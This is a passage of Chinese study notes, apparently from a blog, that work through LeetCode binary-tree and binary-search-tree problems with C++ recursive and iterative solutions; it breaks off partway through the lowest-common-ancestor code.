    <content type="html"><![CDATA[<p>本文为学习<ahref="https://programmercarl.com/">代码随想录</a>时所做的笔记，仅供学习参考，不做任何商业用途，若有侵权，请联系删除。</p><h1 id="合并二叉树">合并二叉树</h1><p><a href="https://leetcode.cn/problems/merge-two-binary-trees/">617.合并二叉树 - 力扣（LeetCode）</a></p><ol type="1"><li><p>确定递归函数的参数和返回值</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function">TreeNode* <span class="hljs-title">mergeTrees</span><span class="hljs-params">(TreeNode* t1, TreeNode* t2)</span> </span><br></code></pre></td></tr></table></figure></li><li><p>确定终止条件</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">if</span> (t1 == <span class="hljs-literal">NULL</span>) <span class="hljs-keyword">return</span> t2; <span class="hljs-comment">// 如果t1为空，合并之后就应该是t2</span><br><span class="hljs-keyword">if</span> (t2 == <span class="hljs-literal">NULL</span>) <span class="hljs-keyword">return</span> t1; <span class="hljs-comment">// 如果t2为空，合并之后就应该是t1</span><br></code></pre></td></tr></table></figure></li><li><p>确定单层递归的逻辑</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs cpp">t1-&gt;left = <span class="hljs-built_in">mergeTrees</span>(t1-&gt;left, t2-&gt;left);<br>t1-&gt;right = <span class="hljs-built_in">mergeTrees</span>(t1-&gt;right, t2-&gt;right);<br><span class="hljs-keyword">return</span> t1;<br></code></pre></td></tr></table></figure></li></ol><span id="more"></span><p>前序遍历</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function">TreeNode* <span class="hljs-title">mergeTrees</span><span class="hljs-params">(TreeNode* t1, TreeNode* t2)</span> </span>&#123;<br>        <span class="hljs-keyword">if</span> (t1 == <span class="hljs-literal">NULL</span>) <span class="hljs-keyword">return</span> t2; <span class="hljs-comment">// 如果t1为空，合并之后就应该是t2</span><br>        <span class="hljs-keyword">if</span> (t2 == <span class="hljs-literal">NULL</span>) <span class="hljs-keyword">return</span> t1; <span class="hljs-comment">// 如果t2为空，合并之后就应该是t1</span><br>        <span class="hljs-comment">// 修改了t1的数值和结构</span><br>        t1-&gt;val += t2-&gt;val;                             <span class="hljs-comment">// 中</span><br>        t1-&gt;left = <span class="hljs-built_in">mergeTrees</span>(t1-&gt;left, t2-&gt;left);      <span class="hljs-comment">// 左</span><br>        t1-&gt;right = <span class="hljs-built_in">mergeTrees</span>(t1-&gt;right, t2-&gt;right);   <span class="hljs-comment">// 右</span><br>        <span class="hljs-keyword">return</span> t1;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><p>中序遍历</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function">TreeNode* <span class="hljs-title">mergeTrees</span><span class="hljs-params">(TreeNode* t1, TreeNode* t2)</span> </span>&#123;<br>        <span class="hljs-keyword">if</span> (t1 == <span class="hljs-literal">NULL</span>) <span class="hljs-keyword">return</span> t2; <span class="hljs-comment">// 如果t1为空，合并之后就应该是t2</span><br>        <span class="hljs-keyword">if</span> (t2 == <span class="hljs-literal">NULL</span>) <span class="hljs-keyword">return</span> t1; <span class="hljs-comment">// 如果t2为空，合并之后就应该是t1</span><br>        <span class="hljs-comment">// 修改了t1的数值和结构</span><br>        t1-&gt;left = <span class="hljs-built_in">mergeTrees</span>(t1-&gt;left, t2-&gt;left);      <span class="hljs-comment">// 左</span><br>        t1-&gt;val += t2-&gt;val;                             <span class="hljs-comment">// 中</span><br>        t1-&gt;right = <span class="hljs-built_in">mergeTrees</span>(t1-&gt;right, t2-&gt;right);   <span class="hljs-comment">// 右</span><br>        <span class="hljs-keyword">return</span> t1;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><p>后序遍历</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function">TreeNode* <span class="hljs-title">mergeTrees</span><span class="hljs-params">(TreeNode* t1, TreeNode* t2)</span> </span>&#123;<br>        <span class="hljs-keyword">if</span> (t1 == <span class="hljs-literal">NULL</span>) <span class="hljs-keyword">return</span> t2; <span class="hljs-comment">// 如果t1为空，合并之后就应该是t2</span><br>        <span class="hljs-keyword">if</span> (t2 == <span class="hljs-literal">NULL</span>) <span class="hljs-keyword">return</span> t1; <span class="hljs-comment">// 如果t2为空，合并之后就应该是t1</span><br>        <span class="hljs-comment">// 修改了t1的数值和结构</span><br>        t1-&gt;left = <span class="hljs-built_in">mergeTrees</span>(t1-&gt;left, t2-&gt;left);      <span class="hljs-comment">// 左</span><br>        t1-&gt;right = <span class="hljs-built_in">mergeTrees</span>(t1-&gt;right, t2-&gt;right);   <span class="hljs-comment">// 右</span><br>        t1-&gt;val += t2-&gt;val;                             <span class="hljs-comment">// 中</span><br>        <span class="hljs-keyword">return</span> t1;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h1 id="二叉树中的搜索">二叉树中的搜索</h1><p><ahref="https://leetcode.cn/problems/search-in-a-binary-search-tree/">700.二叉搜索树中的搜索 - 力扣（LeetCode）</a></p><p>二叉搜索树是一个有序树：</p><ul><li>若它的左子树不空，则左子树上所有结点的值均小于它的根结点的值；</li><li>若它的右子树不空，则右子树上所有结点的值均大于它的根结点的值；</li><li>它的左、右子树也分别为二叉搜索树</li></ul><h2 id="递归法">递归法</h2><ol type="1"><li><p>确定递归函数的参数和返回值</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function">TreeNode* <span class="hljs-title">searchBST</span><span class="hljs-params">(TreeNode* root, <span class="hljs-type">int</span> val)</span></span><br></code></pre></td></tr></table></figure></li><li><p>确定终止条件</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">if</span> (root == <span class="hljs-literal">NULL</span> || root-&gt;val == val) <span class="hljs-keyword">return</span> root;<br></code></pre></td></tr></table></figure></li><li><p>确定单层递归的逻辑</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs cpp">TreeNode* result = <span class="hljs-literal">NULL</span>;<br><span class="hljs-keyword">if</span> (root-&gt;val &gt; val) result = <span class="hljs-built_in">searchBST</span>(root-&gt;left, val);<br><span class="hljs-keyword">if</span> (root-&gt;val &lt; val) result = <span class="hljs-built_in">searchBST</span>(root-&gt;right, val);<br><span class="hljs-keyword">return</span> result;<br></code></pre></td></tr></table></figure></li></ol><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function">TreeNode* <span class="hljs-title">searchBST</span><span class="hljs-params">(TreeNode* root, <span class="hljs-type">int</span> val)</span> </span>&#123;<br>        <span class="hljs-keyword">if</span> (root == <span class="hljs-literal">NULL</span> || root-&gt;val == val) <span class="hljs-keyword">return</span> root;<br>        TreeNode* result = <span class="hljs-literal">NULL</span>;<br>        <span class="hljs-keyword">if</span> (root-&gt;val &gt; val) result = <span class="hljs-built_in">searchBST</span>(root-&gt;left, val);<br>        <span class="hljs-keyword">if</span> (root-&gt;val &lt; val) result = <span class="hljs-built_in">searchBST</span>(root-&gt;right, val);<br>        <span class="hljs-keyword">return</span> result;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="迭代法">迭代法</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function">TreeNode* <span class="hljs-title">searchBST</span><span class="hljs-params">(TreeNode* root, <span class="hljs-type">int</span> val)</span> </span>&#123;<br>        <span class="hljs-keyword">while</span> (root != <span class="hljs-literal">NULL</span>) &#123;<br>            <span class="hljs-keyword">if</span> (root-&gt;val &gt; val) root = root-&gt;left;<br>            <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (root-&gt;val &lt; val) root = root-&gt;right;<br>            <span class="hljs-keyword">else</span> <span class="hljs-keyword">return</span> root;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h1 id="验证二叉搜索树">验证二叉搜索树</h1><p><ahref="https://leetcode.cn/problems/validate-binary-search-tree/">98.验证二叉搜索树 - 力扣（LeetCode）</a></p><h2 id="递归法-1">递归法</h2><h3id="可以递归中序遍历将二叉搜索树转变成一个数组代码如下">可以递归中序遍历将二叉搜索树转变成一个数组，代码如下：</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs cpp">vector&lt;<span class="hljs-type">int</span>&gt; vec;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">traversal</span><span class="hljs-params">(TreeNode* root)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (root == <span class="hljs-literal">NULL</span>) <span class="hljs-keyword">return</span>;<br>    <span class="hljs-built_in">traversal</span>(root-&gt;left);<br>    vec.<span class="hljs-built_in">push_back</span>(root-&gt;val); <span class="hljs-comment">// 将二叉搜索树转换为有序数组</span><br>    <span class="hljs-built_in">traversal</span>(root-&gt;right);<br>&#125;<br></code></pre></td></tr></table></figure><p>然后只要比较一下，这个数组是否是有序的，<strong>注意二叉搜索树中不能有重复元素</strong>。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-built_in">traversal</span>(root);<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt; vec.<span class="hljs-built_in">size</span>(); i++) &#123;<br>    <span class="hljs-comment">// 注意要小于等于，搜索树里不能有相同元素</span><br>    <span class="hljs-keyword">if</span> (vec[i] &lt;= vec[i - <span class="hljs-number">1</span>]) <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br></code></pre></td></tr></table></figure><p>整体代码</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">private</span>:<br>    vector&lt;<span class="hljs-type">int</span>&gt; vec;<br>    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">traversal</span><span class="hljs-params">(TreeNode* root)</span> </span>&#123;<br>        <span class="hljs-keyword">if</span> (root == <span class="hljs-literal">NULL</span>) <span class="hljs-keyword">return</span>;<br>        <span class="hljs-built_in">traversal</span>(root-&gt;left);<br>        vec.<span class="hljs-built_in">push_back</span>(root-&gt;val); <span class="hljs-comment">// 将二叉搜索树转换为有序数组</span><br>        <span class="hljs-built_in">traversal</span>(root-&gt;right);<br>    &#125;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">isValidBST</span><span class="hljs-params">(TreeNode* root)</span> </span>&#123;<br>        vec.<span class="hljs-built_in">clear</span>(); <span class="hljs-comment">// 不加这句在leetcode上也可以过，但最好加上</span><br>        <span class="hljs-built_in">traversal</span>(root);<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt; vec.<span class="hljs-built_in">size</span>(); i++) &#123;<br>            <span class="hljs-comment">// 注意要小于等于，搜索树里不能有相同元素</span><br>            <span class="hljs-keyword">if</span> (vec[i] &lt;= vec[i - <span class="hljs-number">1</span>]) <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h3 id="直接比较">直接比较</h3><ul><li><p>确定递归函数，返回值以及参数</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-type">long</span> <span class="hljs-type">long</span> maxVal = LONG_MIN; <span class="hljs-comment">// 因为后台测试数据中有int最小值</span><br><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">isValidBST</span><span class="hljs-params">(TreeNode* root)</span></span><br></code></pre></td></tr></table></figure></li><li><p>确定终止条件</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">if</span> (root == <span class="hljs-literal">NULL</span>) <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br></code></pre></td></tr></table></figure></li><li><p>确定单层递归的逻辑</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-type">bool</span> left = <span class="hljs-built_in">isValidBST</span>(root-&gt;left);         <span class="hljs-comment">// 左</span><br><br><span class="hljs-comment">// 中序遍历，验证遍历的元素是不是从小到大</span><br><span class="hljs-keyword">if</span> (maxVal &lt; root-&gt;val) maxVal = root-&gt;val; <span class="hljs-comment">// 中</span><br><span class="hljs-keyword">else</span> <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br><br><span class="hljs-type">bool</span> right = <span class="hljs-built_in">isValidBST</span>(root-&gt;right);       <span class="hljs-comment">// 右</span><br><span class="hljs-keyword">return</span> left &amp;&amp; right;<br></code></pre></td></tr></table></figure></li></ul><p>整体代码</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    TreeNode* pre = <span class="hljs-literal">NULL</span>; <span class="hljs-comment">// 用来记录前一个节点</span><br>    <span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">isValidBST</span><span class="hljs-params">(TreeNode* root)</span> </span>&#123;<br>        <span class="hljs-keyword">if</span> (root == <span class="hljs-literal">NULL</span>) <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>        <span class="hljs-type">bool</span> left = <span class="hljs-built_in">isValidBST</span>(root-&gt;left);<br><br>        <span class="hljs-keyword">if</span> (pre != <span class="hljs-literal">NULL</span> &amp;&amp; pre-&gt;val &gt;= root-&gt;val) <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        pre = root; <span class="hljs-comment">// 记录前一个节点</span><br><br>        <span class="hljs-type">bool</span> right = <span class="hljs-built_in">isValidBST</span>(root-&gt;right);<br>        <span class="hljs-keyword">return</span> left &amp;&amp; right;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h1 id="二叉搜索树的最小绝对差">二叉搜索树的最小绝对差</h1><p><ahref="https://leetcode.cn/problems/minimum-absolute-difference-in-bst/">530.二叉搜索树的最小绝对差 - 力扣（LeetCode）</a></p><h2 id="递归">递归</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">private</span>:<br>vector&lt;<span class="hljs-type">int</span>&gt; vec;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">traversal</span><span class="hljs-params">(TreeNode* root)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (root == <span class="hljs-literal">NULL</span>) <span class="hljs-keyword">return</span>;<br>    <span class="hljs-built_in">traversal</span>(root-&gt;left);<br>    vec.<span class="hljs-built_in">push_back</span>(root-&gt;val); <span class="hljs-comment">// 将二叉搜索树转换为有序数组</span><br>    <span class="hljs-built_in">traversal</span>(root-&gt;right);<br>&#125;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">getMinimumDifference</span><span class="hljs-params">(TreeNode* root)</span> </span>&#123;<br>        vec.<span class="hljs-built_in">clear</span>();<br>        <span class="hljs-built_in">traversal</span>(root);<br>        <span class="hljs-keyword">if</span> (vec.<span class="hljs-built_in">size</span>() &lt; <span class="hljs-number">2</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>        <span class="hljs-type">int</span> result = INT_MAX;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt; vec.<span class="hljs-built_in">size</span>(); i++) &#123; <span class="hljs-comment">// 统计有序数组的最小差值</span><br>            result = <span class="hljs-built_in">min</span>(result, vec[i] - vec[i<span class="hljs-number">-1</span>]);<br>        &#125;<br>        <span class="hljs-keyword">return</span> result;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">private</span>:<br><span class="hljs-type">int</span> result = INT_MAX;<br>TreeNode* pre = <span class="hljs-literal">NULL</span>;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">traversal</span><span class="hljs-params">(TreeNode* cur)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (cur == <span class="hljs-literal">NULL</span>) <span class="hljs-keyword">return</span>;<br>    <span class="hljs-built_in">traversal</span>(cur-&gt;left);   <span class="hljs-comment">// 左</span><br>    <span class="hljs-keyword">if</span> (pre != <span class="hljs-literal">NULL</span>)&#123;       <span class="hljs-comment">// 中</span><br>        result = <span class="hljs-built_in">min</span>(result, cur-&gt;val - pre-&gt;val);<br>    &#125;<br>    pre = cur; <span class="hljs-comment">// 记录前一个</span><br>    <span class="hljs-built_in">traversal</span>(cur-&gt;right);  <span class="hljs-comment">// 右</span><br>&#125;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">getMinimumDifference</span><span class="hljs-params">(TreeNode* root)</span> </span>&#123;<br>        <span class="hljs-built_in">traversal</span>(root);<br>        <span class="hljs-keyword">return</span> result;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h1 id="二叉搜索树中的众数">二叉搜索树中的众数</h1><p><ahref="https://leetcode.cn/problems/find-mode-in-binary-search-tree/">501.二叉搜索树中的众数 - 力扣（LeetCode）</a></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">private</span>:<br>    <span class="hljs-type">int</span> maxCount = <span class="hljs-number">0</span>; <span class="hljs-comment">// 最大频率</span><br>    <span class="hljs-type">int</span> count = <span class="hljs-number">0</span>; <span class="hljs-comment">// 统计频率</span><br>    TreeNode* pre = <span class="hljs-literal">NULL</span>;<br>    vector&lt;<span class="hljs-type">int</span>&gt; result;<br>    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">searchBST</span><span class="hljs-params">(TreeNode* cur)</span> </span>&#123;<br>        <span class="hljs-keyword">if</span> (cur == <span class="hljs-literal">NULL</span>) <span class="hljs-keyword">return</span> ;<br><br>        <span class="hljs-built_in">searchBST</span>(cur-&gt;left);       <span class="hljs-comment">// 左</span><br>                                    <span class="hljs-comment">// 中</span><br>        <span class="hljs-keyword">if</span> (pre == <span class="hljs-literal">NULL</span>) &#123; <span class="hljs-comment">// 第一个节点</span><br>            count = <span class="hljs-number">1</span>;<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (pre-&gt;val == cur-&gt;val) &#123; <span class="hljs-comment">// 与前一个节点数值相同</span><br>            count++;<br>        &#125; <span class="hljs-keyword">else</span> &#123; <span class="hljs-comment">// 与前一个节点数值不同</span><br>            count = <span class="hljs-number">1</span>;<br>        &#125;<br>        pre = cur; <span class="hljs-comment">// 更新上一个节点</span><br><br>        <span class="hljs-keyword">if</span> (count == maxCount) &#123; <span class="hljs-comment">// 如果和最大值相同，放进result中</span><br>            result.<span class="hljs-built_in">push_back</span>(cur-&gt;val);<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (count &gt; maxCount) &#123; <span class="hljs-comment">// 如果计数大于最大值频率</span><br>            maxCount = count;   <span class="hljs-comment">// 更新最大频率</span><br>            result.<span class="hljs-built_in">clear</span>();     <span class="hljs-comment">// 很关键的一步，不要忘记清空result，之前result里的元素都失效了</span><br>            result.<span class="hljs-built_in">push_back</span>(cur-&gt;val);<br>        &#125;<br><br>        <span class="hljs-built_in">searchBST</span>(cur-&gt;right);      <span class="hljs-comment">// 右</span><br>        <span class="hljs-keyword">return</span> ;<br>    &#125;<br><br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function">vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">findMode</span><span class="hljs-params">(TreeNode* root)</span> </span>&#123;<br>        count = <span class="hljs-number">0</span>;<br>        maxCount = <span class="hljs-number">0</span>;<br>        TreeNode* pre = <span class="hljs-literal">NULL</span>; <span class="hljs-comment">// 记录前一个节点</span><br>        result.<span class="hljs-built_in">clear</span>();<br><br>        <span class="hljs-built_in">searchBST</span>(root);<br>        <span class="hljs-keyword">return</span> result;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h1 id="二叉树的最近公共祖先">二叉树的最近公共祖先</h1><p><ahref="https://leetcode.cn/problems/lowest-common-ancestor-of-a-binary-tree/">236.二叉树的最近公共祖先 - 力扣（LeetCode）</a></p><ul><li><p>确定递归函数的返回值以及参数</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function">TreeNode* <span class="hljs-title">lowestCommonAncestor</span><span class="hljs-params">(TreeNode* root, TreeNode* p, TreeNode* q)</span></span><br><span class="hljs-function"></span><br></code></pre></td></tr></table></figure></li><li><p>确定终止条件</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">if</span> (root == q || root == p || root == <span class="hljs-literal">NULL</span>) <span class="hljs-keyword">return</span> root;<br></code></pre></td></tr></table></figure></li><li><p>确定单层递归逻辑</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs cpp">left = 递归函数(root-&gt;left);  <span class="hljs-comment">// 左</span><br>right = 递归函数(root-&gt;right); <span class="hljs-comment">// 右</span><br>left与right的逻辑处理;         <span class="hljs-comment">// 中 </span><br></code></pre></td></tr></table></figure></li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function">TreeNode* <span class="hljs-title">lowestCommonAncestor</span><span class="hljs-params">(TreeNode* root, TreeNode* p, TreeNode* q)</span> </span>&#123;<br>        <span class="hljs-keyword">if</span> (root == q || root == p || root == <span class="hljs-literal">NULL</span>) <span class="hljs-keyword">return</span> root;<br>        TreeNode* left = <span class="hljs-built_in">lowestCommonAncestor</span>(root-&gt;left, p, q);<br>        TreeNode* right = <span class="hljs-built_in">lowestCommonAncestor</span>(root-&gt;right, p, q);<br>        <span class="hljs-keyword">if</span> (left != <span class="hljs-literal">NULL</span> &amp;&amp; right != <span class="hljs-literal">NULL</span>) <span class="hljs-keyword">return</span> root;<br><br>        <span class="hljs-keyword">if</span> (left == <span class="hljs-literal">NULL</span> &amp;&amp; right != <span class="hljs-literal">NULL</span>) <span class="hljs-keyword">return</span> right;<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (left != <span class="hljs-literal">NULL</span> &amp;&amp; right == <span class="hljs-literal">NULL</span>) <span class="hljs-keyword">return</span> left;<br>        <span class="hljs-keyword">else</span>  &#123; <span class="hljs-comment">//  (left == NULL &amp;&amp; right == 